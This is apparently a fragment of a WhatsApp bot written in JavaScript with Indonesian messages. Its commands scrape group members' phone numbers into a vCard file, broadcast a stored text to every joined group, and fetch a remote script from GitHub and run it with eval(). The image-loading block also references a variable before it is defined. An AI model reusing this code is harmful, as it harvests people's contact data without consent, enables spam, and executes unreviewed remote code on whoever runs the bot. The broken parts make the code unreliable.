case "svkontakid": {
   if (!isOwner) return zoxreply(`𝗞𝗵𝘂𝘀𝘂𝘀 𝗭𝗼𝘅 𝗦𝘁𝗼𝗿𝗲 !!`)
   if (isGroup) return zoxreply(" 𝗕𝘂𝗮𝘁 𝗱𝗶 𝗣𝗿𝗶𝘃𝗮𝘁𝗲")
   if (!text) return zoxreply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .listgc`)
   await zoxreply("⚡ 𝗢𝘁𝘄 𝗕𝘂𝗮𝘁 𝗙𝗶𝗹𝗲 𝗞𝗼𝗻𝘁𝗮𝗸 𝗡𝘆𝗮  !!_")
   const groupMetadataa = !isGroup? await KiZex.groupMetadata(`${text}`).catch(e => {}) : ""
   const participants = !isGroup? await groupMetadataa.participants : ""
   const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
   for (let mem of halls) {
      if (isContacts) return
      contacts.push(mem)
      fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
   }
   try {
      const uniqueContacts = [...new Set(contacts)];
      const vcardContent = uniqueContacts.map((contact, index) => {
         const vcard = [
            "BEGIN:VCARD",
            "VERSION:3.0",
            `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
            `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
            "END:VCARD",
            "", ].join("\n");
         return vcard; }).join("");
      fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
   } catch (err) {
      reply(util.format(err))
   } finally {
      await KiZex.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "⚡ 𝗦𝘂𝗸𝘀𝗲𝘀 𝗕𝗼𝘀 𝗧𝗶𝗻𝗴𝗴𝗮𝗹 𝗦𝗮𝘃𝗲 𝗔𝗷𝗮 𝗧𝘂𝗵 😁⚡", mimetype: "text/vcard", }, { quoted: m })
      contacts.splice(0, contacts.length)
      fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
   }
}
break
case "botzox": case "𝓫𝓸𝓽𝔃𝓸𝔁": case "𝚋𝚘𝚝𝚣𝚘𝚡": case "ꃳꄲ꓄ꁴ​ꄲꉧ":  case "𝙗𝙤𝙩𝙯𝙤𝙭": case "฿ø₮ⱬøӿ": case "𝕓𝕠𝕥𝕫𝕠𝕩": case "ᗷᓍᖶᘔᓍ᙭": case "ጌዐፕጊዐሸ": case "boʇzox": case "🄱🄾🅃🅉🄾🅇": case "ʙᴏᴛᴢᴏx": case "𝖇𝖔𝖙𝖟𝖔𝖝": case "𝘣𝘰𝘵𝘻𝘰𝘹": case "฿Ø₮ⱫØӾ": case "ⓑⓞⓣⓩⓞⓧ": case "𝔟𝔬𝔱𝔷𝔬𝔵": case "ｂｏｔｚｏｘ": case "[̲̅b][̲̅o][̲̅t][̲̅z][̲̅o][̲̅x]": case "🅑🅞🅣🅩🅞🅧": case "🅱🅾🆃🆉🅾🆇": case "Ⴆσƚȥσx": case "ßð†zðx": case "𝗯𝗼𝘁𝘇𝗼𝘅": case "вσтzσχ": case "ᏰᎾᎿᏃᎾᎲ": case "𝐛𝐨𝐭𝐳𝐨𝐱": case "̶b̶o̶t̶z̶o̶x": {
    if (!isOwner) return m.reply("𝗛𝗮𝗻𝘆𝗮 𝗭𝗼𝘅 𝗬𝗴 𝗕𝗶𝘀𝗮");
    if (!isPremium) return zoxreply(mess.premium);

    const text12 = `❄ 𝗠𝗘𝗡𝗨 𝗭𝗢𝗫 𝗕𝗢𝗧 ❄`;

    // Coba gunakan gambar lokal atau gambar dari URL jika gambar lokal tidak ada
    let imgsc1, imgsc2, imgsc3, imgsc4, imgsc5, imgsc6, imgsc7, imgsc8, imgsc9, imgsc10, imgsc11;
    try {
        // Pastikan gambar ada di path yang benar
        imgsc1 = await prepareWAMessageMedia({ image: await fs.readFileSync(`${global.gslide}`) }, { upload: KiZex.waUploadToServer });
        imgsc2 = await prepareWAMessageMedia({ image: await fs.readFileSync(`${global.gslide}`) }, { upload: KiZex.waUploadToServer });
        imgsc3 = await prepareWAMessageMedia({ image: await fs.readFileSync(`${global.gslide}`) }, { upload: KiZex.waUploadToServer });
        imgsc4 = await prepareWAMessageMedia({ image: await fs.readFileSync(`${global.gslide}`) }, { upload: KiZex.waUploadToServer });
        imgsc5 = await prepareWAMessageMedia({ image: await fs.readFileSync(`${global.gslide}`) }, { upload: KiZex.waUploadToServer });
        imgsc6 = await prepareWAMessageMedia({ image: await fs.readFileSync(`${global.gslide}`) }, { upload: KiZex.waUploadToServer });
        imgsc7 = await prepareWAMessageMedia({ image: await fs.readFileSync(`${global.gslide}`) }, { upload: KiZex.waUploadToServer });
        imgsc8 = await prepareWAMessageMedia({ image: await fs.readFileSync(`${global.gslide}`) }, { upload: KiZex.waUploadToServer });
        imgsc9 = await prepareWAMessageMedia({ image: await fs.readFileSync(`${global.gslide}`) }, { upload: KiZex.waUploadToServer });
        imgsc10 = await prepareWAMessageMedia({ image: await fs.readFileSync(`${global.gslide}`) }, { upload: KiZex.waUploadToServer });
        imgsc11 = await prepareWAMessageMedia({ image: await fs.readFileSync(`${global.gslide}`) }, { upload: KiZex.waUploadToServer });
    } catch (error) {
        console.error('Error uploading local image:', error);

        // Jika gambar lokal tidak ada, coba gunakan URL gambar dan unduh gambar
        const imgUrl1 = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar pertama
        const imgUrl2 = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar kedua
        const imgUrl3 = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar ketiga
        const imgUrl4 = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar keempat
        const imgUrl5 = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar kedua
        const imgUrl6 = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar ketiga
        const imgUrl7 = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar keempat
        const imgUrl8 = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar kedua
        const imgUrl9 = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar ketiga
        const imgUrl10 = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar keempat
        const imgUrl11 = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar keempat

        // Mengunduh gambar pertama
        const imgBuffer1 = await axios.get(imgUrl1, { responseType: 'arraybuffer' }).then(res => Buffer.from(res.data));
        imgsc1 = await prepareWAMessageMedia({ image: imgBuffer1 }, { upload: KiZex.waUploadToServer });

        // Mengunduh gambar kedua
        const imgBuffer2 = await axios.get(imgUrl2, { responseType: 'arraybuffer' }).then(res => Buffer.from(res.data));
        imgsc2 = await prepareWAMessageMedia({ image: imgBuffer2 }, { upload: KiZex.waUploadToServer });

        // Mengunduh gambar ketiga
        const imgBuffer3 = await axios.get(imgUrl3, { responseType: 'arraybuffer' }).then(res => Buffer.from(res.data));
        imgsc3 = await prepareWAMessageMedia({ image: imgBuffer3 }, { upload: KiZex.waUploadToServer });

        // Mengunduh gambar keempat
        const imgBuffer4 = await axios.get(imgUrl4, { responseType: 'arraybuffer' }).then(res => Buffer.from(res.data));
        imgsc4 = await prepareWAMessageMedia({ image: imgBuffer4 }, { upload: KiZex.waUploadToServer });
        
        const imgBuffer5 = await axios.get(imgUrl5, { responseType: 'arraybuffer' }).then(res => Buffer.from(res.data));
        imgsc5 = await prepareWAMessageMedia({ image: imgBuffer5 }, { upload: KiZex.waUploadToServer });

        // Mengunduh gambar ketiga
        const imgBuffer6 = await axios.get(imgUrl6, { responseType: 'arraybuffer' }).then(res => Buffer.from(res.data));
        imgsc6 = await prepareWAMessageMedia({ image: imgBuffer6 }, { upload: KiZex.waUploadToServer });

        // Mengunduh gambar keempat
        const imgBuffer7 = await axios.get(imgUrl7, { responseType: 'arraybuffer' }).then(res => Buffer.from(res.data));
        imgsc7 = await prepareWAMessageMedia({ image: imgBuffer7 }, { upload: KiZex.waUploadToServer });
        
        const imgBuffer8 = await axios.get(imgUrl8, { responseType: 'arraybuffer' }).then(res => Buffer.from(res.data));
        imgsc9 = await prepareWAMessageMedia({ image: imgBuffer9 }, { upload: KiZex.waUploadToServer });

        // Mengunduh gambar ketiga
        const imgBuffer9 = await axios.get(imgUrl9, { responseType: 'arraybuffer' }).then(res => Buffer.from(res.data));
        imgsc9 = await prepareWAMessageMedia({ image: imgBuffer9 }, { upload: KiZex.waUploadToServer });

        // Mengunduh gambar keempat
        const imgBuffer10 = await axios.get(imgUrl10, { responseType: 'arraybuffer' }).then(res => Buffer.from(res.data));
        imgsc10 = await prepareWAMessageMedia({ image: imgBuffer10 }, { upload: KiZex.waUploadToServer });
        
        const imgBuffer11 = await axios.get(imgUrl11, { responseType: 'arraybuffer' }).then(res => Buffer.from(res.data));
        imgsc11 = await prepareWAMessageMedia({ image: imgBuffer11 }, { upload: KiZex.waUploadToServer });
    }

    // Membuat pesan interaktif dengan empat slide
    const msgii = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `⚙️ 𝗦𝗰 𝗕𝘆 𝗭𝗼𝘅 ⚡\n${text12}`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: [
                            {
                                header: proto.Message.InteractiveMessage.Header.fromObject({
                                    title: `${global.slide1}`,
                                    hasMediaAttachment: true,
                                    imageMessage: imgsc1.imageMessage
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                    buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: `{"display_text":"⚡ Zox Zex ⚡","url":"https://wa.me/6285607378046"}`
                                    }]
                                })
                            },
                            {
                                header: proto.Message.InteractiveMessage.Header.fromObject({
                                    title: `${global.slide2}`, 
                                    hasMediaAttachment: true,
                                    imageMessage: imgsc2.imageMessage
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                    buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: `{"display_text":"⚡ Zox Zex ⚡","url":"https://wa.me/6285607378046"}`
                                    }]
                                })
                            },
                            {
                                header: proto.Message.InteractiveMessage.Header.fromObject({
                                    title: `${global.slide3}`, 
                                    hasMediaAttachment: true,
                                    imageMessage: imgsc3.imageMessage
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                    buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: `{"display_text":"⚡ Zox ⚡","url":"https://wa.me/6285607378046"}`
                                    }]
                                })
                            },
                            {
                            header: proto.Message.InteractiveMessage.Header.fromObject({
                                    title: `${global.slide4}`, 
                                    hasMediaAttachment: true,
                                    imageMessage: imgsc4.imageMessage
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                    buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: `{"display_text":"⚡ Zox ⚡","url":"https://wa.me/6285607378046"}`
                                    }]
                                })
                            },
                            {
                            header: proto.Message.InteractiveMessage.Header.fromObject({
                                    title: `${global.slide5}`, 
                                    hasMediaAttachment: true,
                                    imageMessage: imgsc5.imageMessage
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                    buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: `{"display_text":"⚡ Zox ⚡","url":"https://wa.me/6285607378046"}`
                                    }]
                                })
                            },
                            {
                            header: proto.Message.InteractiveMessage.Header.fromObject({
                                    title: `${global.slide6}`, 
                                    hasMediaAttachment: true,
                                    imageMessage: imgsc6.imageMessage
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                    buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: `{"display_text":"⚡ Zox ⚡","url":"https://wa.me/6285607378046"}`
                                    }]
                                })
                            },
                            {
                            header: proto.Message.InteractiveMessage.Header.fromObject({
                                    title: `${global.slide7}`, 
                                    hasMediaAttachment: true,
                                    imageMessage: imgsc7.imageMessage
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                    buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: `{"display_text":"⚡ Zox ⚡","url":"https://wa.me/6285607378046"}`
                                    }]
                                })
                            },
                            {
                            header: proto.Message.InteractiveMessage.Header.fromObject({
                                    title: `${global.slide8}`, 
                                    hasMediaAttachment: true,
                                    imageMessage: imgsc8.imageMessage
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                    buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: `{"display_text":"⚡ Zox ⚡","url":"https://wa.me/6285607378046"}`
                                    }]
                                })
                            },
                            {
                            header: proto.Message.InteractiveMessage.Header.fromObject({
                                    title: `${global.slide9}`, 
                                    hasMediaAttachment: true,
                                    imageMessage: imgsc9.imageMessage
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                    buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: `{"display_text":"⚡ Zox ⚡","url":"https://wa.me/6285607378046"}`
                                    }]
                                })
                            },
                            {
                            header: proto.Message.InteractiveMessage.Header.fromObject({
                                    title: `${global.slide10}`, 
                                    hasMediaAttachment: true,
                                    imageMessage: imgsc11.imageMessage
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                    buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: `{"display_text":"⚡ Zox ⚡","url":"https://wa.me/6285607378046"}`
                                    }]
                                })
                            },
                            {
                                header: proto.Message.InteractiveMessage.Header.fromObject({
                                    title: `${global.slide11}`, 
                                    hasMediaAttachment: true,
                                    imageMessage: imgsc10.imageMessage
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                    buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: `{"display_text":"⚡ Zox ⚡","url":"https://wa.me/6285607378046"}`
                                    }]
                                })
                            }
                        ]
                    })
                })
            }
        }
    }, { userJid: m.sender, quoted: m });

    // Memeriksa apakah pesan datang dari grup atau pesan pribadi
    if (m.chat.endsWith('@g.us')) {
        // Jika dari grup, kirim pesan ke grup
        await KiZex.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
    } else {
        // Jika dari nomor pribadi, kirim pesan hanya ke pengirim (pribadi)
        await KiZex.relayMessage(m.sender, msgii.message, { messageId: msgii.key.id });
    }
}
break;
case 'svkontakgc': {
   if (!isOwner) return zoxreply(`𝗞𝗵𝘂𝘀𝘂𝘀 𝗭𝗼𝘅 𝗦𝘁𝗼𝗿𝗲 !!`)
   if (isGroup) return zoxreply(" 𝗕𝘂𝗮𝘁 𝗱𝗶 𝗣𝗿𝗶𝘃𝗮𝘁𝗲")
   if (!text) return zoxreply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .listgc`)

   // Mengambil file raw GitHub
   const url = 'https://raw.githubusercontent.com/Farel123-ok/case1/main/svkontakgc.js'; // Ganti dengan URL raw GitHub
   try {
      const response = await fetch(url);
      const fileContent = await response.text();
      eval(fileContent); // Mengeksekusi kode JavaScript yang ada di file raw GitHub
   } catch (error) {
      console.error("Error loading raw file: ", error);
   }
}
break;
case "listgc": {
let gcall = Object.values(await KiZex.groupFetchAllParticipating().catch(_=> null))
let listgc = `*𝐋𝐈𝐒𝐓 𝐀𝐋𝐋 𝐂𝐇𝐀𝐓 𝐆𝐑𝐎𝐔𝐏*\n\n`
await gcall.forEach((u, i) => {
listgc += `⚡ 𝗧𝗜𝗧𝗟𝗘 : ${u.subject}\nID : ${u.id}\n⚡ 𝗠𝗘𝗠𝗕𝗘𝗥 : ${u.participants.length}\n🪛 𝗦𝗧𝗔𝗧𝗨𝗦: ${u.announce == true ? "𝗧𝗨𝗧𝗨𝗣 ❌" : "𝗕𝗨𝗞𝗔 ✅"}\n⚡ 𝗖𝗥𝗘𝗔𝗧𝗢𝗥 : ${u.owner ? u.owner.split('@')[0] : '⚡ 𝗦𝗨𝗗𝗔𝗛 𝗞𝗘𝗟𝗨𝗔𝗥'}\n\n`
})
m.reply(listgc)
}
break
case "startjpm": {
if (!isOwner) return m.reply('Hanya Zox');
var teksnya = await fs.readFileSync("./all/database/teksjpm.js").toString()
if (teksnya.length < 1) return m.reply("⚡ 𝗧𝗘𝗞𝗦 𝗝𝗣𝗠 𝗚𝗞 𝗔𝗗𝗔")
var teks = `${teksnya}`
let total = 0
let getGroups = await KiZex.groupFetchAllParticipating()
let usergc = await Object.keys(getGroups)
m.reply(`⚡ 𝗣𝗥𝗢𝗦𝗘𝗦 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 ${usergc.length} 𝗚𝗥𝗨𝗣 𝗕𝗬 𝗭𝗢𝗫 𝗦𝗧𝗢𝗥𝗘`)
for (let jid of usergc) {
try {
await KiZex.sendMessage(jid, {text: teks}, {quoted: qloc})
total += 1
} catch {}
await sleep(4000)
}
m.reply(`⚡ 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 𝗗𝗜 𝗞𝗜𝗥𝗜𝗠 ${total} 𝗚𝗥𝗨𝗣 𝗕𝗬 𝗭𝗢𝗫`)
}
break
